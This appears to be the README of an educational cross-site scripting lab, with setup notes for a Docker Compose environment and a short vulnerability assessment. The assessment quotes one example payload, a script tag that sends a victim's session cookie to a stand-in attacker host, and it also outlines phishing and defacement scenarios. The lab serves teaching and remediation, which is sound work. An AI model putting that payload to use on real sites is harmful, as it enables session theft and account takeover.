# XSS Security Lab

Educational cross-site scripting lab with vulnerability analysis and remediation notes.

**HTML · JavaScript · Docker**

## Learning focus

Untrusted input rendered in the browser and cross-site scripting.

## Repository guide

| Resource | Location |
| --- | --- |
| Remediation | [Fix.md](Fix.md) |
| Compose configuration | [cyber0x0.1.00 (1)/pro_00/docker-compose.yml](cyber0x0.1.00%20%281%29/pro_00/docker-compose.yml) |

## Inspect the lab

1. Read the assessment and remediation notes together.
2. Inspect the Dockerfile and Compose configuration before running the application.
3. Use an isolated local environment for authorized training. The supplied Compose file publishes a host port; it is not a production deployment configuration.
4. Record observations and compare them with the mitigation notes.

## Setup requirements

Docker with Compose is required for the supplied container configuration. The lab directory is `cyber0x0.1.00 (1)/pro_00`.

Container builds and vulnerability demonstrations have not been revalidated as part of this documentation update.

## Original assessment

### XSS Vulnerability Assessment

## Vulnerability Type
The application is vulnerable to **Cross-Site Scripting (XSS)**. According to **OWASP** (Open Worldwide Application Security Project), XSS occurs when an application includes untrusted data in a web page without proper validation or escaping. This allows attackers to execute malicious scripts in the victim's browser.

## Exploitation Scenarios
1. **Session Hijacking (Cookie Theft):** 
   An attacker can inject a payload that sends the victim's session cookie to a server controlled by the attacker. Example: `<script>fetch('http://attacker.com/?cookie=' + document.cookie)</script>`. This allows the attacker to take over the victim's account.

2. **Website Defacement & Phishing:**
   The attacker can inject HTML/JS to modify the visual appearance of the page or present a fake login form. When users try to log in, their credentials are sent directly to the attacker instead of the legitimate server.

---

Part of [Osama Alsmadi’s project portfolio](https://github.com/osamaalsmadi).
